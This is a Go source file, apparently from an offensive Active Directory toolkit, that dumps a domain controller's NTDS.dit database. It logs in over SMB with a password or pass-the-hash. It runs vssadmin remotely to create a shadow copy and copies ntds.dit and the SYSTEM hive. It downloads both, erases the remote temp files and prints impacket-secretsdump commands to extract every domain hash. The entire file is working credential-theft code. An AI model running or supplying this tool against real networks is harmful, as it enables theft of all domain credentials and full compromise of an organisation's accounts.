// pkg/smb/shadowcopy.go
//
// NTDS dump via Volume Shadow Copy Service (VSS)
//
// Méthode : créer un shadow copy de C:, copier ntds.dit + SYSTEM hive,
// télécharger via C$, parser avec impacket-secretsdump.
//
// Nécessite : Domain Admin ou Backup Operators + accès admin au DC

package smb

import (
	"fmt"
	"net"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"time"

	"github.com/hirochachacha/go-smb2"
)

// NTDSResult résultat d'un dump NTDS via VSS
type NTDSResult struct {
	NTDSPath   string
	SYSTEMPath string
	ShadowGUID string
	Target     string
}

// ShadowCopyConfig configuration pour le dump VSS
type ShadowCopyConfig struct {
	Target    string
	Username  string
	Domain    string
	Password  string
	NTHash    []byte
	OutputDir string
	Timeout   time.Duration
	Cleanup   bool // supprimer le shadow copy après dump
}

// DumpNTDSViaShadowCopy effectue un dump complet de NTDS.dit via VSS
func DumpNTDSViaShadowCopy(cfg *ShadowCopyConfig) (*NTDSResult, error) {
	if cfg.Timeout == 0 {
		cfg.Timeout = 60 * time.Second
	}
	if cfg.OutputDir == "" {
		cfg.OutputDir = "."
	}

	fmt.Printf("[*] NTDS dump via VSS on %s as %s\\%s\n",
		cfg.Target, cfg.Domain, cfg.Username)

	conn, err := net.DialTimeout("tcp", cfg.Target+":445", cfg.Timeout)
	if err != nil {
		return nil, fmt.Errorf("SMB connection failed: %v", err)
	}
	defer conn.Close()

	d := &smb2.Dialer{
		Initiator: &smb2.NTLMInitiator{
			User:     cfg.Username,
			Password: cfg.Password,
			Domain:   cfg.Domain,
			Hash:     cfg.NTHash,
		},
	}

	session, err := d.Dial(conn)
	if err != nil {
		return nil, fmt.Errorf("SMB auth failed: %v", err)
	}
	defer session.Logoff()

	// Vérifier l'accès admin
	adminFS, err := session.Mount("ADMIN$")
	if err != nil {
		return nil, fmt.Errorf("admin access required (ADMIN$ unavailable): %v", err)
	}
	adminFS.Umount()
	fmt.Println("[+] Admin access confirmed")

	id := randHex(4)
	result := &NTDSResult{Target: cfg.Target}

	// 1. Créer le shadow copy et récupérer le device path
	shadowGUID, shadowDevice, err := runVSSCreate(cfg, session, id)
	if err != nil {
		return nil, fmt.Errorf("VSS creation failed: %v", err)
	}
	result.ShadowGUID = shadowGUID
	fmt.Printf("[+] Shadow copy created: %s\n", shadowDevice)

	// 2. Copier ntds.dit et SYSTEM hive depuis le shadow
	tempNTDS := fmt.Sprintf(`C:\Windows\Temp\%s_ntds.dit`, id)
	tempSYSTEM := fmt.Sprintf(`C:\Windows\Temp\%s_system.hiv`, id)

	copyCmd := fmt.Sprintf(
		`cmd /c copy "%s\Windows\NTDS\ntds.dit" "%s" /y 2>&1 & copy "%s\Windows\System32\config\SYSTEM" "%s" /y 2>&1`,
		shadowDevice, tempNTDS, shadowDevice, tempSYSTEM,
	)

	fmt.Println("[*] Copying ntds.dit and SYSTEM from shadow copy...")
	copyCfg := DefaultExecConfig()
	copyCfg.Timeout = 30 * time.Second
	copyCfg.NoCleanup = true
	copyResult, err := SvcExec(cfg.Target, cfg.Username, cfg.Domain, cfg.Password, cfg.NTHash, copyCmd, copyCfg)
	if err != nil {
		vssCleanup(cfg, shadowGUID, id)
		return nil, fmt.Errorf("file copy failed: %v", err)
	}
	if strings.Contains(strings.ToLower(copyResult.Output), "error") ||
		strings.Contains(strings.ToLower(copyResult.Output), "erreur") {
		fmt.Printf("[!] Copy warning: %s\n", copyResult.Output)
	}

	time.Sleep(2 * time.Second)

	// 3. Télécharger les fichiers via C$
	localNTDS := filepath.Join(cfg.OutputDir, id+"_ntds.dit")
	localSYSTEM := filepath.Join(cfg.OutputDir, id+"_system.hiv")

	fmt.Println("[*] Downloading ntds.dit...")
	ntdsBytes, err := downloadHive(session, tempNTDS)
	if err != nil {
		vssCleanup(cfg, shadowGUID, id)
		return nil, fmt.Errorf("ntds.dit download failed: %v", err)
	}

	fmt.Println("[*] Downloading SYSTEM hive...")
	systemBytes, err := downloadHive(session, tempSYSTEM)
	if err != nil {
		vssCleanup(cfg, shadowGUID, id)
		return nil, fmt.Errorf("SYSTEM hive download failed: %v", err)
	}

	// Écrire localement
	if err := os.WriteFile(localNTDS, ntdsBytes, 0600); err != nil {
		return nil, fmt.Errorf("cannot save ntds.dit: %v", err)
	}
	if err := os.WriteFile(localSYSTEM, systemBytes, 0600); err != nil {
		return nil, fmt.Errorf("cannot save SYSTEM hive: %v", err)
	}

	result.NTDSPath = localNTDS
	result.SYSTEMPath = localSYSTEM

	fmt.Printf("[+] ntds.dit  → %s (%d bytes)\n", localNTDS, len(ntdsBytes))
	fmt.Printf("[+] SYSTEM    → %s (%d bytes)\n", localSYSTEM, len(systemBytes))

	// 4. Cleanup remote temp files
	cleanupHives(session, []string{tempNTDS, tempSYSTEM})

	// 5. Cleanup shadow copy
	if cfg.Cleanup {
		fmt.Println("[*] Deleting shadow copy...")
		vssCleanup(cfg, shadowGUID, id)
		fmt.Println("[+] Shadow copy deleted")
	} else {
		fmt.Printf("[!] Shadow copy NOT deleted. Manual cleanup:\n")
		fmt.Printf("    vssadmin delete shadows /shadow=%s /quiet\n", shadowGUID)
	}

	// 6. Instructions
	fmt.Println()
	fmt.Println("[+] Dump complete! Parse hashes with:")
	fmt.Printf("    impacket-secretsdump -ntds %s -system %s LOCAL\n", localNTDS, localSYSTEM)
	fmt.Printf("    impacket-secretsdump -ntds %s -system %s LOCAL | grep ':::'\n", localNTDS, localSYSTEM)

	return result, nil
}

// runVSSCreate crée un shadow copy et parse le device path
func runVSSCreate(cfg *ShadowCopyConfig, session *smb2.Session, id string) (string, string, error) {
	outFile := fmt.Sprintf(`C:\Windows\Temp\%s_vss.txt`, id)

	execCfg := DefaultExecConfig()
	execCfg.Timeout = 45 * time.Second
	execCfg.NoCleanup = true
	execCfg.OutputFile = outFile

	result, err := SvcExec(cfg.Target, cfg.Username, cfg.Domain, cfg.Password, cfg.NTHash,
		`vssadmin create shadow /for=C:`, execCfg)
	if err != nil {
		return "", "", err
	}

	// Nettoyer le fichier de sortie temp
	defer cleanupHives(session, []string{outFile})

	shadowGUID := parseShadowGUID(result.Output)
	shadowDevice := parseShadowDevice(result.Output)

	if shadowGUID == "" || shadowDevice == "" {
		return "", "", fmt.Errorf("could not parse VSS output (maybe no permission):\n%s", result.Output)
	}

	return shadowGUID, shadowDevice, nil
}

func parseShadowGUID(output string) string {
	patterns := []string{
		`(?i)Shadow Copy ID:\s*(\{[0-9a-fA-F-]+\})`,
		`(?i)ID de.*?copi.*?:\s*(\{[0-9a-fA-F-]+\})`,
		`(\{[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}\})`,
	}
	for _, pattern := range patterns {
		re := regexp.MustCompile(pattern)
		if m := re.FindStringSubmatch(output); len(m) >= 2 {
			return m[1]
		}
	}
	return ""
}

func parseShadowDevice(output string) string {
	patterns := []string{
		`(?i)Shadow Copy Volume Name:\s*(\S+)`,
		`(\\\\[?\\]GLOBALROOT\\Device\\[^\s\r\n\\]+)`,
		`(?i)Nom du volume.*?:\s*(\S+)`,
	}
	for _, pattern := range patterns {
		re := regexp.MustCompile(pattern)
		if m := re.FindStringSubmatch(output); len(m) >= 2 {
			return strings.TrimRight(m[1], `\`)
		}
	}
	return ""
}

func vssCleanup(cfg *ShadowCopyConfig, shadowGUID, id string) {
	if shadowGUID == "" {
		return
	}
	cleanCfg := DefaultExecConfig()
	cleanCfg.Timeout = 15 * time.Second
	SvcExec(cfg.Target, cfg.Username, cfg.Domain, cfg.Password, cfg.NTHash,
		fmt.Sprintf(`vssadmin delete shadows /shadow=%s /quiet`, shadowGUID), cleanCfg)
}
